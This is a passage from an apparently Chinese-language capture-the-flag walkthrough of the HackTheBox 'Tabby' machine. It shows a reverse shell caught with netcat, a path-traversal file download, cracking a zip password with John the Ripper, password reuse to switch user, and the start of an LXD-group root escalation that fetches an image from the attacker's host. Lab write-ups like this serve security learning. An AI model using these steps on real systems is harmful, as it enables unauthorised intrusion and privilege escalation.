04:44:04 GMT<br>&lt; <br>OK - Deployed application at context path [/shell]<br>* Connection <span class="hljs-comment">#0 to host 10.10.10.194 left intact</span><br></code></pre></td></tr></table></figure>

<p>18、开始本地监听，并使用浏览器访问目标war包地址，至此成功获取初始靶机权限</p>
<p><code>http://10.10.10.194:8080/shell</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ nc -lvnp 443                      <br>listening on [any] 443 ...<br>connect to [10.10.14.2] from (UNKNOWN) [10.10.10.194] 52692<br><span class="hljs-built_in">id</span><br>uid=997(tomcat) gid=997(tomcat) <span class="hljs-built_in">groups</span>=997(tomcat)<br>python3 -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br>tomcat@tabby:/var/lib/tomcat9$ <br><br>tomcat@tabby:/var/lib/tomcat9$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>conf  lib  logs  policy  webapps  work<br></code></pre></td></tr></table></figure>

<p>19、通过对当前网站源码下进行信息枚举，发现了一个压缩包文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">tomcat@tabby:/var/lib/tomcat9$ <span class="hljs-built_in">cd</span> /var/www/html                                 <br><span class="hljs-built_in">cd</span> /var/www/html<br>tomcat@tabby:/var/www/html$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>assets  favicon.ico  files  index.php  logo.png  news.php  Readme.txt<br>tomcat@tabby:/var/www/html$ <span class="hljs-built_in">cd</span> files<br><span class="hljs-built_in">cd</span> files<br>tomcat@tabby:/var/www/html/files$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>16162020_backup.zip  archive  revoked_certs  statement<br>tomcat@tabby:/var/www/html/files$ <span class="hljs-built_in">ls</span> -la<br><span class="hljs-built_in">ls</span> -la<br>total 36<br>drwxr-xr-x 4 ash  ash  4096 Aug 19  2021 .<br>drwxr-xr-x 4 root root 4096 Aug 19  2021 ..<br>-rw-r--r-- 1 ash  ash  8716 Jun 16  2020 16162020_backup.zip                             <br>drwxr-xr-x 2 root root 4096 Aug 19  2021 archive                                         <br>drwxr-xr-x 2 root root 4096 Aug 19  2021 revoked_certs<br>-rw-r--r-- 1 root root 6507 Jun 16  2020 statement<br>tomcat@tabby:/var/www/html/files$<br></code></pre></td></tr></table></figure>

<p>20、这里使用网站上的本地文件包含漏洞，成功下载到本地该压缩包文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ wget http://megahosting.htb/news.php?file=../../../../../../../../var/www/html/files/16162020_backup.zip     <br>--2023-12-23 12:53:25--  http://megahosting.htb/news.php?file=../../../../../../../../var/www/html/files/16162020_backup.zip<br>正在解析主机 megahosting.htb (megahosting.htb)... 10.10.10.194<br>正在连接 megahosting.htb (megahosting.htb)|10.10.10.194|:80... 已连接。<br>已发出 HTTP 请求，正在等待回应... 200 OK<br>长度：未指定 [text/html]<br>正在保存至: “news.php?file=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fvar%2Fwww%2Fhtml%2Ffiles%2F16162020_backup.zip”<br><br>news.php?file=..%2F..%     [ &lt;=&gt;                      ]   8.51K  --.-KB/s  用时 0s      <br><br>2023-12-23 12:53:26 (301 MB/s) - “news.php?file=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fvar%2Fwww%2Fhtml%2Ffiles%2F16162020_backup.zip” 已保存 [8716]<br></code></pre></td></tr></table></figure>

<p>21、通过解压该压缩包，发现需要输入密码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ unzip 16162020_backup.zip <br>Archive:  16162020_backup.zip<br>   creating: var/www/html/assets/<br>[16162020_backup.zip] var/www/html/favicon.ico password: <br>   skipping: var/www/html/favicon.ico  incorrect password<br>   creating: var/www/html/files/<br>   skipping: var/www/html/index.php  incorrect password<br>   skipping: var/www/html/logo.png   incorrect password<br>   skipping: var/www/html/news.php   incorrect password<br>   skipping: var/www/html/Readme.txt  incorrect password<br></code></pre></td></tr></table></figure>

<p>22、使用 zip2john 和 John 进行破解该压缩包</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ zip2john 16162020_backup.zip &gt; hashzip <br>ver 1.0 16162020_backup.zip/var/www/html/assets/ is not encrypted, or stored with non-handled compression <span class="hljs-built_in">type</span><br>ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/favicon.ico PKZIP Encr: TS_chk, cmplen=338, decmplen=766, crc=282B6DE2 ts=7DB5 cs=7db5 <span class="hljs-built_in">type</span>=8<br>ver 1.0 16162020_backup.zip/var/www/html/files/ is not encrypted, or stored with non-handled compression <span class="hljs-built_in">type</span><br>ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/index.php PKZIP Encr: TS_chk, cmplen=3255, decmplen=14793, crc=285CC4D6 ts=5935 cs=5935 <span class="hljs-built_in">type</span>=8<br>ver 1.0 efh 5455 efh 7875 ** 2b ** 16162020_backup.zip/var/www/html/logo.png PKZIP Encr: TS_chk, cmplen=2906, decmplen=2894, crc=02F9F45F ts=5D46 cs=5d46 <span class="hljs-built_in">type</span>=0<br>ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/news.php PKZIP Encr: TS_chk, cmplen=114, decmplen=123, crc=5C67F19E ts=5A7A cs=5a7a <span class="hljs-built_in">type</span>=8<br>ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/Readme.txt PKZIP Encr: TS_chk, cmplen=805, decmplen=1574, crc=32DB9CE3 ts=6A8B cs=6a8b <span class="hljs-built_in">type</span>=8<br>NOTE: It is assumed that all files <span class="hljs-keyword">in</span> each archive have the same password.<br>If that is not the <span class="hljs-keyword">case</span>, the <span class="hljs-built_in">hash</span> may be uncrackable. To avoid this, use<br>option -o to pick a file at a time.<br>                                                                                         <br>┌──(kali㉿kali)-[~/桌面]<br>└─$ sudo john ./hashzip --wordlist=/usr/share/wordlists/rockyou.txt <br>[sudo] kali 的密码：<br>Using default input encoding: UTF-8<br>Loaded 1 password <span class="hljs-built_in">hash</span> (PKZIP [32/64])<br>Will run 3 OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="hljs-keyword">for</span> status<br>admin@it         (16162020_backup.zip)     <br>1g 0:00:00:00 DONE (2023-12-23 12:56) 1.818g/s 18856Kp/s 18856Kc/s 18856KC/s adzlogan..adamsapple:)1<br>Use the <span class="hljs-string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably<br>Session completed. <br></code></pre></td></tr></table></figure>

<p>23、成功破解出密码，密码为： admin@it ，但是解压缩出压缩包，压缩包里并没有什么有用的信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ unzip 16162020_backup.zip                                   <br>Archive:  16162020_backup.zip<br>[16162020_backup.zip] var/www/html/favicon.ico password: <br>  inflating: var/www/html/favicon.ico  <br>  inflating: var/www/html/index.php  <br> extracting: var/www/html/logo.png   <br>  inflating: var/www/html/news.php   <br>  inflating: var/www/html/Readme.txt  <br>     <br>┌──(kali㉿kali)-[~/桌面]<br>└─$ <span class="hljs-built_in">cd</span> ./var <br><br>┌──(kali㉿kali)-[~/桌面/var]<br>└─$ <span class="hljs-built_in">ls</span><br>www<br><br>┌──(kali㉿kali)-[~/桌面/var]<br>└─$ <span class="hljs-built_in">cd</span> www  <br><br>┌──(kali㉿kali)-[~/桌面/var/www]<br>└─$ <span class="hljs-built_in">ls</span><br>html<br><br>┌──(kali㉿kali)-[~/桌面/var/www]<br>└─$ <span class="hljs-built_in">cd</span> html <br><br>┌──(kali㉿kali)-[~/桌面/var/www/html]<br>└─$ <span class="hljs-built_in">ls</span><br>assets  favicon.ico  files  index.php  logo.png  news.php  Readme.txt<br></code></pre></td></tr></table></figure>

<p>24、根据以往判断，该压缩包密码应该就是前期查看的 etc&#x2F;passwd 里 ash 用户的密码，逐进行ssh登录</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面/var/www/html]<br>└─$ ssh ash@10.10.10.194                                           <br>The authenticity of host <span class="hljs-string">&#x27;10.10.10.194 (10.10.10.194)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:mUt3fTn2/uoySPc6XapKq69a2/3EPRdW0T79hZ2davk.</span><br><span class="hljs-string">This key is not known by any other names.</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>10.10.10.194<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">ash@10.10.10.194: Permission denied (publickey).</span><br></code></pre></td></tr></table></figure>

<p>25、发现无法通过ssh的形式登录，那就通过初始权限进行su 切换，至此获取到第一个flag信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">tomcat@tabby:/var/www/html/files$ su ash<br>su ash<br>Password: admin@it<br><br>ash@tabby:/var/www/html/files$ <br><br>ash@tabby:/var/www/html/files$ <span class="hljs-built_in">cd</span> /home/ash<br><span class="hljs-built_in">cd</span> /home/ash<br>ash@tabby:~$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>user.txt<br>ash@tabby:~$ <span class="hljs-built_in">cat</span> user.txt<br><span class="hljs-built_in">cat</span> user.txt<br>768309c7c35c34564705bf6bf54b8390<br>ash@tabby:~$ <br></code></pre></td></tr></table></figure>

<h4 id="0x02-系统权限获取"><a href="#0x02-系统权限获取" class="headerlink" title="0x02 系统权限获取"></a>0x02 系统权限获取</h4><p>26、通过查看自身账号用户组，发现我们拥有 lxd 组的权限，lxd组是一个虚拟容器的东西</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">ash@tabby:~$ <span class="hljs-built_in">id</span><br><span class="hljs-built_in">id</span><br>uid=1000(ash) gid=1000(ash) <span class="hljs-built_in">groups</span>=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)<br>ash@tabby:~$ sudo -l<br>sudo -l<br>sudo: unable to open /run/sudo/ts/ash: Read-only file system<br>[sudo] password <span class="hljs-keyword">for</span> ash: admin@it<br><br>Sorry, user ash may not run sudo on tabby.<br>ash@tabby:~$ <br></code></pre></td></tr></table></figure>

<p>27、这里应该是让通过lxd容器镜像挂在的方式进行挂到到root目录下，并行读取相关信息和文件，由于我对这块的技能实在薄弱，故参考演示文档进行操作</p>
<p><code>在 LXD (Linux Containers Daemon) 中，你可以使用 lxc 命令来管理容器。要列出存在的容器（类似于 VM 映像），可以使用以下命令：</code></p>
<p><code>lxc list</code><br><code>这会列出当前系统中的所有容器，包括它们的名称、状态、IP 地址等信息。如果你只想列出运行中的容器，可以使用 -c 选项：</code></p>
<p><code>lxc list -c ns</code><br><code>请确保在运行这些命令时有足够的权限，通常需要使用 sudo 或者具有相应权限的用户。</code></p>
<p><code>本地“lxd”组的成员可以立即将权限升级为主机操作系统上的 root。这与该用户是否已被授予 sudo 权限无关，并且不需要他们输入密码。即使使用 LXD snap 包，该漏洞也存在。</code></p>
<p><code>LXD 是一个根进程，可为任何对 LXD UNIX 套接字具有写访问权限的人执行操作。它通常不会尝试匹配调用用户的权限。有多种方法可以利用这一点。</code></p>
<p><code>其中之一是使用 LXD API 将主机的根文件系统挂载到本文将使用的容器中。这为低权限用户提供了对主机文件系统的 root 访问权限。</code> </p>
<p>28、查看下当前靶机的系统环境</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">ash@tabby:~$ <span class="hljs-built_in">uname</span> -a<br><span class="hljs-built_in">uname</span> -a<br>Linux tabby 5.4.0-31-generic <span class="hljs-comment">#35-Ubuntu SMP Thu May 7 20:20:34 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span><br>ash@tabby:~$ <br></code></pre></td></tr></table></figure>

<p>29、下载漏洞利用制作等工具程序，并着手制作镜像</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@InfoSec:~<span class="hljs-comment"># git clone  https://github.com/saghul/lxd-alpine-builder.git</span><br>Cloning into <span class="hljs-string">&#x27;lxd-alpine-builder&#x27;</span>...<br>remote: Enumerating objects: 50, <span class="hljs-keyword">done</span>.<br>remote: Counting objects: 100% (8/8), <span class="hljs-keyword">done</span>.<br>remote: Compressing objects: 100% (6/6), <span class="hljs-keyword">done</span>.<br>remote: Total 50 (delta 2), reused 5 (delta 2), pack-reused 42<br>Receiving objects: 100% (50/50), 3.11 MiB | 1.43 MiB/s, <span class="hljs-keyword">done</span>.<br>Resolving deltas: 100% (15/15), <span class="hljs-keyword">done</span>.<br>root@InfoSec:~<span class="hljs-comment"># cd lxd-alpine-builder</span><br>root@InfoSec:~/lxd-alpine-builder<span class="hljs-comment"># ls</span><br>alpine-v3.13-x86_64-20210218_0139.tar.gz  build-alpine  LICENSE  README.md<br>root@InfoSec:~/lxd-alpine-builder<span class="hljs-comment"># ./build-alpine</span><br>Determining the latest release... v3.19<br>Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.19/main/x86_64<br>Downloading alpine-keys-2.4-r1.apk<br>tar: Ignoring unknown extended header keyword <span class="hljs-string">&#x27;APK-TOOLS.checksum.SHA1&#x27;</span><br>tar: Ignoring unknown extended header keyword <span class="hljs-string">&#x27;APK-TOOLS.checksum.SHA1&#x27;</span><br>tar: Ignoring unknown extended header keyword <span class="hljs-string">&#x27;APK-TOOLS.checksum.SHA1&#x27;</span><br>tar: Ignoring unknown extended header keyword <span class="hljs-string">&#x27;APK-TOOLS.checksum.SHA1&#x27;</span><br>tar: Ignoring unknown extended header keyword <span class="hljs-string">&#x27;APK-TOOLS.checksum.SHA1&#x27;</span><br>tar: Ignoring unknown extended header keyword <span class="hljs-string">&#x27;APK-TOOLS.checksum.SHA1&#x27;</span><br>tar: Ignoring unknown extended header keyword <span class="hljs-string">&#x27;APK-TOOLS.checksum.SHA1&#x27;</span><br>tar: Ignoring unknown extended header keyword <span class="hljs-string">&#x27;APK-TOOLS.checksum.SHA1&#x27;</span><br>tar: Ignoring unknown extended header keyword <span class="hljs-string">&#x27;APK-TOOLS.checksum.SHA1&#x27;</span><br>tar: Ignoring unknown extended header keyword <span class="hljs-string">&#x27;APK-TOOLS.checksum.SHA1&#x27;</span><br>tar: Ignoring unknown extended header keyword <span class="hljs-string">&#x27;APK-TOOLS.checksum.SHA1&#x27;</span><br>tar: Ignoring unknown extended header keyword <span class="hljs-string">&#x27;APK-TOOLS.checksum.SHA1&#x27;</span><br>tar: Ignoring unknown extended header keyword <span class="hljs-string">&#x27;APK-TOOLS.checksum.SHA1&#x27;</span><br>tar: Ignoring unknown extended header keyword <span class="hljs-string">&#x27;APK-TOOLS.checksum.SHA1&#x27;</span><br>tar: Ignoring unknown extended header keyword <span class="hljs-string">&#x27;APK-TOOLS.checksum.SHA1&#x27;</span><br>tar: Ignoring unknown extended header keyword <span class="hljs-string">&#x27;APK-TOOLS.checksum.SHA1&#x27;</span><br>tar: Ignoring unknown extended header keyword <span class="hljs-string">&#x27;APK-TOOLS.checksum.SHA1&#x27;</span><br>tar: Ignoring unknown extended header keyword <span class="hljs-string">&#x27;APK-TOOLS.checksum.SHA1&#x27;</span><br>tar: Ignoring unknown extended header keyword <span class="hljs-string">&#x27;APK-TOOLS.checksum.SHA1&#x27;</span><br>tar: Ignoring unknown extended header keyword <span class="hljs-string">&#x27;APK-TOOLS.checksum.SHA1&#x27;</span><br>tar: Ignoring unknown extended header keyword <span class="hljs-string">&#x27;APK-TOOLS.checksum.SHA1&#x27;</span><br>tar: Ignoring unknown extended header keyword <span class="hljs-string">&#x27;APK-TOOLS.checksum.SHA1&#x27;</span><br>tar: Ignoring unknown extended header keyword <span class="hljs-string">&#x27;APK-TOOLS.checksum.SHA1&#x27;</span><br>tar: Ignoring unknown extended header keyword <span class="hljs-string">&#x27;APK-TOOLS.checksum.SHA1&#x27;</span><br>tar: Ignoring unknown extended header keyword <span class="hljs-string">&#x27;APK-TOOLS.checksum.SHA1&#x27;</span><br>tar: Ignoring unknown extended header keyword <span class="hljs-string">&#x27;APK-TOOLS.checksum.SHA1&#x27;</span><br>tar: Ignoring unknown extended header keyword <span class="hljs-string">&#x27;APK-TOOLS.checksum.SHA1&#x27;</span><br>tar: Ignoring unknown extended header keyword <span class="hljs-string">&#x27;APK-TOOLS.checksum.SHA1&#x27;</span><br>tar: Ignoring unknown extended header keyword <span class="hljs-string">&#x27;APK-TOOLS.checksum.SHA1&#x27;</span><br>tar: Ignoring unknown extended header keyword <span class="hljs-string">&#x27;APK-TOOLS.checksum.SHA1&#x27;</span><br>tar: Ignoring unknown extended header keyword <span class="hljs-string">&#x27;APK-TOOLS.checksum.SHA1&#x27;</span><br>tar: Ignoring unknown extended header keyword <span class="hljs-string">&#x27;APK-TOOLS.checksum.SHA1&#x27;</span><br>tar: Ignoring unknown extended header keyword <span class="hljs-string">&#x27;APK-TOOLS.checksum.SHA1&#x27;</span><br>tar: Ignoring unknown extended header keyword <span class="hljs-string">&#x27;APK-TOOLS.checksum.SHA1&#x27;</span><br>tar: Ignoring unknown extended header keyword <span class="hljs-string">&#x27;APK-TOOLS.checksum.SHA1&#x27;</span><br>tar: Ignoring unknown extended header keyword <span class="hljs-string">&#x27;APK-TOOLS.checksum.SHA1&#x27;</span><br>tar: Ignoring unknown extended header keyword <span class="hljs-string">&#x27;APK-TOOLS.checksum.SHA1&#x27;</span><br>tar: Ignoring unknown extended header keyword <span class="hljs-string">&#x27;APK-TOOLS.checksum.SHA1&#x27;</span><br>tar: Ignoring unknown extended header keyword <span class="hljs-string">&#x27;APK-TOOLS.checksum.SHA1&#x27;</span><br>tar: Ignoring unknown extended header keyword <span class="hljs-string">&#x27;APK-TOOLS.checksum.SHA1&#x27;</span><br>tar: Ignoring unknown extended header keyword <span class="hljs-string">&#x27;APK-TOOLS.checksum.SHA1&#x27;</span><br>Downloading apk-tools-static-2.14.0-r5.apk<br>tar: Ignoring unknown extended header keyword <span class="hljs-string">&#x27;APK-TOOLS.checksum.SHA1&#x27;</span><br>tar: Ignoring unknown extended header keyword <span class="hljs-string">&#x27;APK-TOOLS.checksum.SHA1&#x27;</span><br>alpine-devel@lists.alpinelinux.org-6165ee59.rsa.pub: OK<br>Verified OK<br>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current<br>                                 Dload  Upload   Total   Spent    Left  Speed<br>100  2724  100  2724    0     0    594      0  0:00:04  0:00:04 --:--:--   594<br>--2023-12-23 13:23:24--  http://alpine.mirror.wearetriple.com/MIRRORS.txt<br>Resolving alpine.mirror.wearetriple.com (alpine.mirror.wearetriple.com)... 93.187.10.106, 2a00:1f00:dc06:10::106<br>Connecting to alpine.mirror.wearetriple.com (alpine.mirror.wearetriple.com)|93.187.10.106|:80... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 2724 (2.7K) [text/plain]<br>Saving to: ‘/root/lxd-alpine-builder/rootfs/usr/share/alpine-mirrors/MIRRORS.txt’<br><br>/root/lxd-alpine-builder/rootfs/usr/s 100%[=========================================================================&gt;]   2.66K  --.-KB/s    <span class="hljs-keyword">in</span> 0s      <br><br>2023-12-23 13:23:25 (394 MB/s) - ‘/root/lxd-alpine-builder/rootfs/usr/share/alpine-mirrors/MIRRORS.txt’ saved [2724/2724]<br><br>Selecting mirror http://repo.iut.ac.ir/repo/alpine/v3.19/main<br>fetch http://repo.iut.ac.ir/repo/alpine/v3.19/main/x86_64/APKINDEX.tar.gz<br>(1/25) Installing alpine-baselayout-data (3.4.3-r2)<br>(2/25) Installing musl (1.2.4_git20230717-r4)<br>(3/25) Installing busybox (1.36.1-r15)<br>Executing busybox-1.36.1-r15.post-install<br>(4/25) Installing busybox-binsh (1.36.1-r15)<br>(5/25) Installing alpine-baselayout (3.4.3-r2)<br>Executing alpine-baselayout-3.4.3-r2.pre-install<br>Executing alpine-baselayout-3.4.3-r2.post-install<br>(6/25) Installing ifupdown-ng (0.12.1-r4)<br>(7/25) Installing libcap2 (2.69-r1)<br>(8/25) Installing openrc (0.52.1-r1)<br>Executing openrc-0.52.1-r1.post-install<br>(9/25) Installing mdev-conf (4.6-r0)<br>(10/25) Installing busybox-mdev-openrc (1.36.1-r15)<br>(11/25) Installing alpine-conf (3.17.0-r0)<br>(12/25) Installing alpine-keys (2.4-r1)<br>(13/25) Installing alpine-release (3.19.0-r0)<br>(14/25) Installing ca-certificates-bundle (20230506-r0)<br>(15/25) Installing libcrypto3 (3.1.4-r2)<br>(16/25) Installing libssl3 (3.1.4-r2)<br>(17/25) Installing ssl_client (1.36.1-r15)<br>(18/25) Installing zlib (1.3-r2)<br>(19/25) Installing apk-tools (2.14.0-r5)<br>(20/25) Installing busybox-openrc (1.36.1-r15)<br>(21/25) Installing busybox-suid (1.36.1-r15)<br>(22/25) Installing scanelf (1.3.7-r2)<br>(23/25) Installing musl-utils (1.2.4_git20230717-r4)<br>(24/25) Installing libc-utils (0.7.2-r5)<br>(25/25) Installing alpine-base (3.19.0-r0)<br>Executing busybox-1.36.1-r15.trigger<br>OK: 10 MiB <span class="hljs-keyword">in</span> 25 packages<br>root@InfoSec:~/lxd-alpine-builder<span class="hljs-comment"># ls</span><br>alpine-v3.13-x86_64-20210218_0139.tar.gz  alpine-v3.19-x86_64-20231223_1324.tar.gz  build-alpine  LICENSE  README.md<br>root@InfoSec:~/lxd-alpine-builder<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure>

<p>30、下载到目标靶机上面，并进行利用部署</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget http://10.10.14.2:8000/alpine-v3.19-x86_64-20231223_1324.tar.gz<br><br>ash@tabby:~$ <span class="hljs-built_in">cd</span> ~<br><span class="hljs-built_in">cd</span> ~<br>ash@tabby:~$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>alpine-v3.19-x86_64-20231223_1324.tar.gz  snap  user.txt<br>ash@tabby:~$ lxd init<br>lxd init<br>Would you like to use LXD clustering? (<span class="hljs-built_in">yes</span>/no) [default=no]: <br><br>Do you want to configure a new storage pool? (<span class="hljs-built_in">yes</span>/no) [default=<span class="hljs-built_in">yes</span>]: <br><br>Name of the new storage pool [default=default]: <br><br>Name of the storage backend to use (btrfs, <span 